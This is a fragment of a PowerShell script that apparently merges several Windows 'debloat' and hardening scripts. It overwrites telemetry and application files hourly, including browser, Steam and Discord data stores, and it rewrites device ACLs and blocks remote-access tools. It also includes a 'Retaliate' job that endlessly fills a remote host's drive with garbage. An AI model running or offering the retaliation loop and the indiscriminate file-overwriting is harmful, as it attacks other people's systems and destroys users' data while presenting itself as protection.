        "$env:ProgramData\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener_1.etl",
        "$env:ProgramData\Microsoft\Diagnosis\ETLLogs\ShutdownLogger.etl",
        "$env:LocalAppData\Microsoft\Windows\WebCache\WebCacheV01.dat",
        "$env:ProgramData\Microsoft\Windows\AppRepository\StateRepository-Deployment.srd",
        "$env:ProgramData\Microsoft\Diagnosis\eventTranscript\eventTranscript.db",
        "$env:SystemRoot\System32\winevt\Logs\Microsoft-Windows-Telemetry%4Operational.evtx",
        "$env:LocalAppData\Microsoft\Edge\User Data\Default\Preferences",
        "$env:ProgramData\NVIDIA Corporation\NvTelemetry\NvTelemetryContainer.etl",
        "$env:ProgramFiles\NVIDIA Corporation\NvContainer\NvContainerTelemetry.etl",
        "$env:LocalAppData\Google\Chrome\User Data\Default\Local Storage\leveldb\*.log",
        "$env:LocalAppData\Google\Chrome\User Data\EventLog\*.etl",
        "$env:LocalAppData\Google\Chrome\User Data\Default\Web Data",
        "$env:ProgramFiles(x86)\Google\Update\GoogleUpdate.log",
        "$env:ProgramData\Adobe\ARM\log\ARMTelemetry.etl",
        "$env:LocalAppData\Adobe\Creative Cloud\ACC\logs\CoreSync.log",
        "$env:ProgramFiles\Common Files\Adobe\OOBE\PDApp.log",
        "$env:ProgramData\Intel\Telemetry\IntelData.etl",
        "$env:ProgramFiles\Intel\Driver Store\Telemetry\IntelGFX.etl",
        "$env:SystemRoot\System32\DriverStore\FileRepository\igdlh64.inf_amd64_*\IntelCPUTelemetry.dat",
        "$env:ProgramData\AMD\CN\AMDDiag.etl",
        "$env:LocalAppData\AMD\CN\logs\RadeonSoftware.log",
        "$env:ProgramFiles\AMD\CNext\CNext\AMDTel.db",
        "$env:ProgramFiles(x86)\Steam\logs\perf.log",
        "$env:LocalAppData\Steam\htmlcache\Cookies",
        "$env:ProgramData\Steam\SteamAnalytics.etl",
        "$env:ProgramData\Epic\EpicGamesLauncher\Data\EOSAnalytics.etl",
        "$env:LocalAppData\EpicGamesLauncher\Saved\Logs\EpicGamesLauncher.log",
        "$env:LocalAppData\Discord\app-*\modules\discord_analytics\*.log",
        "$env:AppData\Discord\Local Storage\leveldb\*.ldb",
        "$env:LocalAppData\Autodesk\Autodesk Desktop App\Logs\AdskDesktopAnalytics.log",
        "$env:ProgramData\Autodesk\Adlm\Telemetry\AdlmTelemetry.etl",
        "$env:AppData\Mozilla\Firefox\Profiles\*\telemetry.sqlite",
        "$env:LocalAppData\Mozilla\Firefox\Telemetry\Telemetry.etl",
        "$env:LocalAppData\Logitech\LogiOptions\logs\LogiAnalytics.log",
        "$env:ProgramData\Logitech\LogiSync\Telemetry.etl",
        "$env:ProgramData\Razer\Synapse3\Logs\RazerSynapse.log",
        "$env:LocalAppData\Razer\Synapse\Telemetry\RazerTelemetry.etl",
        "$env:ProgramData\Corsair\CUE\logs\iCUETelemetry.log",
        "$env:LocalAppData\Corsair\iCUE\Analytics\*.etl",
        "$env:ProgramData\Kaspersky Lab\AVP*\logs\Telemetry.etl",
        "$env:ProgramData\McAfee\Agent\logs\McTelemetry.log",
        "$env:ProgramData\Norton\Norton\Logs\NortonAnalytics.etl",
        "$env:ProgramFiles\Bitdefender\Bitdefender Security\logs\BDTelemetry.db",
        "$env:LocalAppData\Slack\logs\SlackAnalytics.log",
        "$env:ProgramData\Dropbox\client\logs\DropboxTelemetry.etl",
        "$env:LocalAppData\Zoom\logs\ZoomAnalytics.log"
    )

    while ($true) {
        $StartTime = Get-Date
        
        foreach ($File in $TargetFiles) {
            if ($File -match '\*') {
                Get-Item -Path $File -ErrorAction SilentlyContinue | ForEach-Object {
                    Overwrite-File -FilePath $_.FullName
                }
            } else {
                Overwrite-File -FilePath $File
            }
        }

        $ElapsedSeconds = ((Get-Date) - $StartTime).TotalSeconds
        $SleepSeconds = [math]::Max(3600 - $ElapsedSeconds, 0)
        Write-Host "Completed run at $(Get-Date). Sleeping for ${SleepSeconds} seconds until next hour..."
        Start-Sleep -Seconds $SleepSeconds
    }
}
Start-Job -ScriptBlock $CorruptTelemetry

# Execute DevicesFiltering.ps1 logic
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$setAclPath = Join-Path $scriptDir "SetACL.exe"
if (-not (Test-Path $setAclPath)) {
    Write-Error "SetACL.exe not found in the script's folder: $scriptDir"
    exit 1
}
Write-Host "Listing all devices..."
$devices = Get-WmiObject -Class Win32_PnPEntity | Where-Object { $_.DeviceID -ne $null } | Select-Object Name, DeviceID
$devices | Format-Table -AutoSize
$consoleLogonGroup = "S-1-2-1"
foreach ($device in $devices) {
    $deviceId = $device.DeviceID
    Write-Host "Setting permissions for device: $($device.Name) ($deviceId)"
    & $setAclPath -on $deviceId -ot reg -actn setprot -op "dacl:np" -ace "n:$consoleLogonGroup;p:full"
    & $setAclPath -on $deviceId -ot reg -actn setprot -op "dacl:np"
    & $setAclPath -on $deviceId -ot reg -actn rstchldrn -rst "dacl,sacl"
    Write-Host "Permissions updated for $deviceId"
}
Write-Host "Permissions update completed for all devices."

# Execute NetworkDebloat.ps1 logic
$componentsToDisable = @(
    "ms_server",     # File and Printer Sharing
    "ms_msclient",   # Client for Microsoft Networks
    "ms_pacer",      # QoS Packet Scheduler
    "ms_lltdio",     # Link Layer Mapper I/O Driver
    "ms_rspndr",     # Link Layer Responder
    "ms_tcpip6"      # IPv6
)
$adapters = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
foreach ($adapter in $adapters) {
    foreach ($component in $componentsToDisable) {
        Disable-NetAdapterBinding -Name $adapter.Name -ComponentID $component -Confirm:$false -ErrorAction SilentlyContinue
    }
}
$ldapPorts = @(389, 636)
foreach ($port in $ldapPorts) {
    New-NetFirewallRule -DisplayName "Block LDAP Port $port" -Direction Outbound -Protocol TCP -RemotePort $port -Action Block -ErrorAction SilentlyContinue
}

# Execute Retaliate.ps1 logic
Start-Job -ScriptBlock {
    while ($true) {
        Fill-RemoteHostDriveWithGarbage
    }
}

# Execute SecureRemoteAccess.ps1 logic
Write-Host "Starting Windows Remote Access Security Hardening..." -ForegroundColor Green
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance" -Name "fAllowToGetHelp" -Value 0
Write-Host "Remote Desktop and Remote Assistance disabled."
New-NetFirewallRule -DisplayName "Block RDP Inbound" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Block -Enabled True
New-NetFirewallRule -DisplayName "Block VNC Inbound" -Direction Inbound -Protocol TCP -LocalPort 5900-5902 -Action Block -Enabled True
New-NetFirewallRule -DisplayName "Block TeamViewer Inbound" -Direction Inbound -Protocol TCP -LocalPort 5938 -Action Block -Enabled True
New-NetFirewallRule -DisplayName "Block AnyDesk Inbound" -Direction Inbound -Protocol TCP -LocalPort 7070 -Action Block -Enabled True
Write-Host "Firewall rules added to block RDP, VNC, TeamViewer, and AnyDesk ports."
$gpPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
if (-not (Test-Path $gpPath)) {
    New-Item -Path $gpPath -Force | Out-Null
}
Set-ItemProperty -Path $gpPath -Name "fDenyTSConnections" -Value 1
Write-Host "Group Policy updated to disable Remote Desktop Services."
$adminAccount = Get-LocalUser -Name "Administrator" -ErrorAction SilentlyContinue
if ($adminAccount) {
    Disable-LocalUser -Name "Administrator"
    Write-Host "Default Administrator account disabled."
} else {
    Write-Host "Default Administrator account not found or already disabled."
}
$restrictPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"
if (-not (Test-Path $restrictPath)) {
    New-Item -Path $restrictPath -Force | Out-Null
}
$blockedApps = "TeamViewer.exe,AnyDesk.exe"
Set-ItemProperty -Path $restrictPath -Name "DisallowRun" -Value 1
New-Item -Path "$restrictPath\DisallowRun" -Force | Out-Null
$blockedApps.Split(",") | ForEach-Object { Set-ItemProperty -Path "$restrictPath\DisallowRun" -Name $_ -Value $_ }
Write-Host "Group Policy updated to block specified remote access software."
Set-Service -Name "SSDPSRV" -StartupType Disabled
Stop-Service -Name "SSDPSRV" -Force -ErrorAction SilentlyContinue
Write-Host "UPnP service disabled."
Set-MpPreference -DisableRealtimeMonitoring $false
Write-Host "Windows Defender real-time protection enabled."
$rdpPort = netstat -an | Select-String "3389"
if ($rdpPort) {
    Write-Host "WARNING: Port 3389 is still listening. Please check firewall and service settings manually." -ForegroundColor Yellow
} else {
    Write-Host "RDP port 3389 is not listening."
}

# Execute GSecurity.ps1 logic
Apply-FirewallRules
Enable-LsassPPL
Clear-CachedCredentials
Disable-CredentialCaching
Enable-CredentialAuditing
Write-Log "Initial scan completed. Monitoring started."
Write-Host "Script completed. Reboot the system to apply LSASS PPL changes."
Write-Host "Check Event Viewer (Security logs) for credential access auditing."

Start-Job -Name "GShield-Monitor" -ScriptBlock {
    while ($true) {
        Start-FirewallMonitor
        Start-CrudeKiller
        Kill-Listeners
        Start-ProcessKiller
        Start-XSSWatcher
        Terminate-NonConsoleSessions
        Terminate-Rootkits
        Start-Sleep -Seconds 10
    }
}
